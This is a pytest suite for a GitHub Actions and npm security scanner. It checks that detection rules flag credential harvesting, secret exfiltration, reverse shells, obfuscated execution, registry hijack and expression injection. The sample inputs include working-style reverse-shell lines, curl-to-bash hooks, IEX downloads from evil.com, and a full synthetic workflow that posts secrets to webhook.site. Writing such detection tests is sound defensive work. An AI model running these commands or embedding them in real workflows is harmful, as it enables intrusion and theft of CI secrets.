"""Tests for workflow injection / hardening rules CTW-012 through CTW-023."""

from __future__ import annotations

import sys
from pathlib import Path
from textwrap import dedent

import pytest

ROOT = Path(__file__).resolve().parents[1]
VENDOR_CI = ROOT / "vendor" / "chaintrap-ci" / "src"
VENDOR_STATIC = ROOT / "vendor" / "chaintrap-static-scan" / "src"
SCRIPTS = ROOT / "scripts"

for _p in (VENDOR_CI, VENDOR_STATIC, SCRIPTS):
    if str(_p) not in sys.path:
        sys.path.insert(0, str(_p))

from chaintrap_ci.workflow_audit import _audit_file  # noqa: E402
from chaintrap_ci.run_script_parser import (  # noqa: E402
    egress_hosts,
    has_decode_exec,
    has_env_dump,
    has_expression_injection,
    has_file_write,
    has_git_push,
    has_network_tool,
    has_pkg_manager_hijack,
    has_reverse_shell,
    has_secret_ref,
    has_token_grep,
    is_exfil_sink,
    load_exfil_sinks,
)

DATA_DIR = ROOT / "data"


def _write_wf(tmp_path: Path, content: str) -> Path:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    p = wf_dir / "test.yml"
    p.write_text(dedent(content), encoding="utf-8")
    return p


# ---------------------------------------------------------------------------
# Unit tests for run_script_parser predicates
# ---------------------------------------------------------------------------


def test_egress_hosts_filters_github():
    hosts = egress_hosts("curl https://api.github.com/repos/foo")
    assert hosts == []


def test_egress_hosts_flags_unknown():
    hosts = egress_hosts("curl https://malicious.example.com/payload")
    assert "malicious.example.com" in hosts


def test_egress_hosts_flags_raw_ip():
    from chaintrap_ci.run_script_parser import has_raw_ip
    assert has_raw_ip("curl http://192.168.1.100/data")


def test_has_env_dump_printenv():
    assert has_env_dump("printenv | grep SECRET")


def test_has_env_dump_export_p():
    assert has_env_dump("export -p > /tmp/env.txt")


def test_has_env_dump_get_child_item():
    assert has_env_dump("Get-ChildItem Env: | Format-Table")


def test_has_env_dump_benign():
    assert not has_env_dump("echo 'hello world'")


def test_has_token_grep_pattern():
    assert has_token_grep("grep -r 'ghp_' /home/runner")


def test_has_token_grep_select_string():
    assert has_token_grep("Select-String -Pattern 'ghs_' -Path /tmp")


def test_has_token_grep_benign():
    assert not has_token_grep("grep -r 'TODO' ./src")


def test_has_git_push():
    assert has_git_push("git push origin main")
    assert not has_git_push("git status")


def test_has_file_write_redirect():
    assert has_file_write("echo data > /tmp/out.txt")


def test_has_file_write_github_output():
    assert has_file_write("echo 'value' >> $GITHUB_OUTPUT")


def test_has_file_write_benign():
    assert not has_file_write("ls -la")


def test_has_secret_ref():
    assert has_secret_ref("echo ${{ secrets.NPM_TOKEN }}")
    assert has_secret_ref("export TOKEN=$GITHUB_TOKEN")
    assert not has_secret_ref("echo 'no secrets here'")


def test_has_reverse_shell_dev_tcp():
    assert has_reverse_shell("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")


def test_has_reverse_shell_nc():
    assert has_reverse_shell("nc -e /bin/sh attacker.com 4444")


def test_has_reverse_shell_socat():
    assert has_reverse_shell("socat TCP:attacker.com:4444 EXEC:/bin/bash")


def test_has_reverse_shell_benign():
    assert not has_reverse_shell("nc -z localhost 8080")


def test_has_decode_exec_base64_sh():
    assert has_decode_exec("echo 'cGF5bG9hZA==' | base64 -d | sh")


def test_has_decode_exec_iex():
    assert has_decode_exec("IEX (New-Object Net.WebClient).DownloadString('http://evil.com')")


def test_has_decode_exec_node_e():
    assert has_decode_exec("node -e \"require('child_process').exec('id')\"")


def test_has_decode_exec_benign():
    assert not has_decode_exec("echo 'hello world'")


def test_has_pkg_manager_hijack_registry():
    assert has_pkg_manager_hijack("npm config set registry https://evil.example.com")


def test_has_pkg_manager_hijack_ld_preload():
    assert has_pkg_manager_hijack("export LD_PRELOAD=/tmp/evil.so")


def test_has_pkg_manager_hijack_benign():
    assert not has_pkg_manager_hijack("npm install express")


def test_has_expression_injection_issue_title():
    assert has_expression_injection("echo ${{ github.event.issue.title }}")


def test_has_expression_injection_comment_body():
    assert has_expression_injection("run: ${{ github.event.comment.body }}")


def test_has_expression_injection_pr_title():
    assert has_expression_injection("${{ github.event.pull_request.title }}")


def test_has_expression_injection_benign():
    assert not has_expression_injection("echo ${{ github.sha }}")
    assert not has_expression_injection("echo ${{ github.actor }}")


def test_is_exfil_sink_webhook_site():
    sinks = load_exfil_sinks(DATA_DIR / "exfil_sinks.txt")
    assert is_exfil_sink("webhook.site", sinks)
    assert is_exfil_sink("sub.webhook.site", sinks)
    assert not is_exfil_sink("github.com", sinks)


# ---------------------------------------------------------------------------
# CTW-012: credential / env harvesting
# ---------------------------------------------------------------------------


def test_ctw012_printenv(tmp_path):
    p = _write_wf(tmp_path, """
        name: Harvest
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: printenv | grep -E '^(AWS_|GITHUB_)' > /tmp/env.txt
    """)
    findings = _audit_file(p)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-012" in rules


def test_ctw012_proc_mem(tmp_path):
    p = _write_wf(tmp_path, """
        name: MemScrape
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: cat /proc/1234/environ
    """)
    findings = _audit_file(p)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-012" in rules
    assert any(f["severity"] == "CRITICAL" for f in findings if f["rule_id"] == "CTW-012")


def test_ctw012_benign_echo(tmp_path):
    """Normal echo should not trigger CTW-012."""
    p = _write_wf(tmp_path, """
        name: Benign
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: echo "Hello world"
    """)
    findings = _audit_file(p)
    assert not any(f["rule_id"] == "CTW-012" for f in findings)


# ---------------------------------------------------------------------------
# CTW-013: secret staging to file / artifact
# ---------------------------------------------------------------------------


def test_ctw013_secret_to_file(tmp_path):
    p = _write_wf(tmp_path, """
        name: Stage
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: echo ${{ secrets.NPM_TOKEN }} > output.txt
    """)
    findings = _audit_file(p)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-013" in rules


def test_ctw013_env_dump_to_file(tmp_path):
    p = _write_wf(tmp_path, """
        name: Stage
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: printenv >> /tmp/creds.txt
    """)
    findings = _audit_file(p)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-013" in rules


def test_ctw013_benign_write(tmp_path):
    p = _write_wf(tmp_path, """
        name: Benign
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: echo "version=1.0" >> $GITHUB_OUTPUT
    """)
    findings = _audit_file(p)
    assert not any(f["rule_id"] == "CTW-013" for f in findings)


# ---------------------------------------------------------------------------
# CTW-014: repo self-mutation
# ---------------------------------------------------------------------------


def test_ctw014_git_push(tmp_path):
    p = _write_wf(tmp_path, """
        name: Mutate
        on: push
        permissions:
          contents: write
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  git config user.email bot@example.com
                  git commit -m "update"
                  git push origin main
    """)
    findings = _audit_file(p)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-014" in rules
    assert any(f["severity"] == "CRITICAL" for f in findings if f["rule_id"] == "CTW-014")


def test_ctw014_benign_clone(tmp_path):
    p = _write_wf(tmp_path, """
        name: Benign
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: git clone https://github.com/example/repo.git
    """)
    findings = _audit_file(p)
    assert not any(f["rule_id"] == "CTW-014" for f in findings)


# ---------------------------------------------------------------------------
# CTW-015: CI/config tampering
# ---------------------------------------------------------------------------


def test_ctw015_workflow_write(tmp_path):
    p = _write_wf(tmp_path, """
        name: Tamper
        on: push
        permissions:
          contents: write
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: echo "backdoor: true" >> .github/workflows/ci.yml
    """)
    findings = _audit_file(p)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-015" in rules
    assert any(f["severity"] == "CRITICAL" for f in findings if f["rule_id"] == "CTW-015")


# ---------------------------------------------------------------------------
# CTW-016: egress to exfil sink
# ---------------------------------------------------------------------------


def test_ctw016_exfil_sink(tmp_path):
    p = _write_wf(tmp_path, """
        name: Exfil
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: curl -X POST https://webhook.site/abc123 -d "data=secret"
    """)
    findings = _audit_file(p, data_dir=DATA_DIR)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-016" in rules
    assert any(f["severity"] == "CRITICAL" for f in findings if f["rule_id"] == "CTW-016")


def test_ctw016_raw_ip(tmp_path):
    p = _write_wf(tmp_path, """
        name: RawIP
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: curl http://10.0.0.99/payload.sh
    """)
    findings = _audit_file(p, data_dir=DATA_DIR)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-016" in rules


def test_ctw016_benign_github(tmp_path):
    p = _write_wf(tmp_path, """
        name: Benign
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: curl https://api.github.com/repos/owner/repo/releases
    """)
    findings = _audit_file(p, data_dir=DATA_DIR)
    assert not any(f["rule_id"] == "CTW-016" for f in findings)


# ---------------------------------------------------------------------------
# CTW-017: reverse shell
# ---------------------------------------------------------------------------


def test_ctw017_dev_tcp(tmp_path):
    p = _write_wf(tmp_path, """
        name: Shell
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: bash -i >& /dev/tcp/attacker.com/4444 0>&1
    """)
    findings = _audit_file(p)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-017" in rules
    assert any(f["severity"] == "CRITICAL" for f in findings if f["rule_id"] == "CTW-017")


# ---------------------------------------------------------------------------
# CTW-018: obfuscated / dynamic exec
# ---------------------------------------------------------------------------


def test_ctw018_base64_decode_sh(tmp_path):
    p = _write_wf(tmp_path, """
        name: Obf
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: echo 'cGF5bG9hZA==' | base64 -d | sh
    """)
    findings = _audit_file(p)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-018" in rules


def test_ctw018_iex(tmp_path):
    p = _write_wf(tmp_path, """
        name: PowerShell Obf
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: windows-latest
            steps:
              - run: IEX (New-Object Net.WebClient).DownloadString('http://evil.com')
    """)
    findings = _audit_file(p)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-018" in rules


# ---------------------------------------------------------------------------
# CTW-019: package manager / runtime hijack
# ---------------------------------------------------------------------------


def test_ctw019_registry_override(tmp_path):
    p = _write_wf(tmp_path, """
        name: Hijack
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: npm config set registry https://evil.registry.com
    """)
    findings = _audit_file(p)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-019" in rules


def test_ctw019_ld_preload(tmp_path):
    p = _write_wf(tmp_path, """
        name: Preload
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: export LD_PRELOAD=/tmp/evil.so && make
    """)
    findings = _audit_file(p)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-019" in rules


def test_ctw019_benign_npm_install(tmp_path):
    p = _write_wf(tmp_path, """
        name: Benign
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: npm install
    """)
    findings = _audit_file(p)
    assert not any(f["rule_id"] == "CTW-019" for f in findings)


# ---------------------------------------------------------------------------
# CTW-022: expression injection
# ---------------------------------------------------------------------------


def test_ctw022_issue_title_injection(tmp_path):
    p = _write_wf(tmp_path, """
        name: Inject
        on: issues
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: echo ${{ github.event.issue.title }}
    """)
    findings = _audit_file(p)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-022" in rules


def test_ctw022_pr_body_injection(tmp_path):
    p = _write_wf(tmp_path, """
        name: PR Inject
        on: pull_request_target
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: echo "${{ github.event.pull_request.body }}"
    """)
    findings = _audit_file(p)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-022" in rules
    # Should be CRITICAL when combined with pull_request_target
    assert any(f["severity"] == "CRITICAL" for f in findings if f["rule_id"] == "CTW-022")


def test_ctw022_benign_sha(tmp_path):
    p = _write_wf(tmp_path, """
        name: Benign
        on: push
        permissions:
          contents: read
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - run: echo ${{ github.sha }}
    """)
    findings = _audit_file(p)
    assert not any(f["rule_id"] == "CTW-022" for f in findings)


# ---------------------------------------------------------------------------
# CTW-023: artifact poisoning
# ---------------------------------------------------------------------------


def test_ctw023_workflow_run_artifact_exec(tmp_path):
    p = _write_wf(tmp_path, """
        name: Artifact Poison
        on:
          workflow_run:
            workflows: ["CI"]
            types: [completed]
        permissions:
          contents: read
          actions: read
        jobs:
          deploy:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/download-artifact@v4
                with:
                  name: dist
              - run: bash ./dist/deploy.sh
    """)
    findings = _audit_file(p)
    rules = [f["rule_id"] for f in findings]
    assert "CTW-023" in rules


def test_ctw023_benign_no_exec(tmp_path):
    """Download without execution should not trigger CTW-023."""
    p = _write_wf(tmp_path, """
        name: Safe Download
        on:
          workflow_run:
            workflows: ["CI"]
            types: [completed]
        permissions:
          contents: read
          actions: read
        jobs:
          check:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/download-artifact@v4
                with:
                  name: dist
              - run: ls -la ./dist/
    """)
    findings = _audit_file(p)
    # ls is not an exec pattern — should not fire CTW-023
    assert not any(f["rule_id"] == "CTW-023" for f in findings)


# ---------------------------------------------------------------------------
# Malicious workflow end-to-end: simulate the cred-exfil test workflow
# ---------------------------------------------------------------------------


def test_cred_exfil_workflow_all_rules(tmp_path):
    """Synthetic malicious workflow should fire multiple rules including CTW-012/013/014/016."""
    p = _write_wf(tmp_path, """
        name: Malicious
        on:
          pull_request_target:
          workflow_dispatch:
        permissions:
          contents: write
          id-token: write
          actions: read
          pull-requests: write
        jobs:
          publish-readme:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
                with:
                  ref: ${{ github.event.pull_request.head.ref }}
                  repository: ${{ github.event.pull_request.head.repo.full_name }}
              - name: Harvest secrets, exfiltrate, and commit README
                run: |
                  CREDS=$(printenv | grep -E '^(NPM_|GITHUB_|AWS_)' || true)
                  curl -X POST "https://webhook.site/exfil" \\
                    -d "token=${{ secrets.NPM_TOKEN }}&gh=${{ secrets.GITHUB_TOKEN }}&env=${CREDS}"
                  cat > chaintrap-watch/README.md <<EOF
                  ${CREDS}
                  EOF
                  git config user.email bot@example.com
                  git config user.name bot
                  git add chaintrap-watch/README.md
                  git commit -m "docs: sync"
                  git push
    """)
    findings = _audit_file(p, data_dir=DATA_DIR)
    rules = {f["rule_id"] for f in findings}
    assert "CTW-001" in rules, f"Missing CTW-001, got: {rules}"
    assert "CTW-008" in rules, f"Missing CTW-008, got: {rules}"
    assert "CTW-012" in rules, f"Missing CTW-012 (env dump), got: {rules}"
    assert "CTW-013" in rules, f"Missing CTW-013 (secret to file), got: {rules}"
    assert "CTW-014" in rules, f"Missing CTW-014 (git push), got: {rules}"
    assert "CTW-016" in rules, f"Missing CTW-016 (exfil sink), got: {rules}"
    critical = [f for f in findings if f["severity"] == "CRITICAL"]
    assert critical, "Expected at least one CRITICAL finding"


# ---------------------------------------------------------------------------
# Supply-chain / package content rules
# ---------------------------------------------------------------------------


def test_ctc_exfil005_discord_webhook():
    from chaintrap_static_scan.npm_malware_rules import NPM_MALWARE_RULES
    import re

    rule = next((r for r in NPM_MALWARE_RULES if r.rule_id == "CTC-EXFIL005"), None)
    assert rule is not None
    payload = "fetch('https://discord.com/api/webhooks/123/abc', {method:'POST', body: creds})"
    assert re.search(rule.pattern, payload, re.IGNORECASE)


def test_ctc_net001_import_time_fetch():
    from chaintrap_static_scan.npm_malware_rules import NPM_MALWARE_RULES
    import re

    rule = next((r for r in NPM_MALWARE_RULES if r.rule_id == "CTC-NET001"), None)
    assert rule is not None
    payload = "const http = require('http'); http.get('http://evil.example.com/payload')"
    assert re.search(rule.pattern, payload, re.IGNORECASE)


def test_ctc_cred003_wallet():
    from chaintrap_static_scan.npm_malware_rules import NPM_MALWARE_RULES
    import re

    rule = next((r for r in NPM_MALWARE_RULES if r.rule_id == "CTC-CRED003"), None)
    assert rule is not None
    payload = "fs.readFileSync(path.join(home, 'wallet.dat'))"
    assert re.search(rule.pattern, payload, re.IGNORECASE)


def test_ctc_ih002_postinstall_fetch():
    from chaintrap_static_scan.npm_malware_rules import NPM_MALWARE_RULES
    import re

    rule = next((r for r in NPM_MALWARE_RULES if r.rule_id == "CTC-IH002"), None)
    assert rule is not None
    payload = '"postinstall": "curl https://evil.com/payload.sh | bash"'
    assert re.search(rule.pattern, payload, re.IGNORECASE)
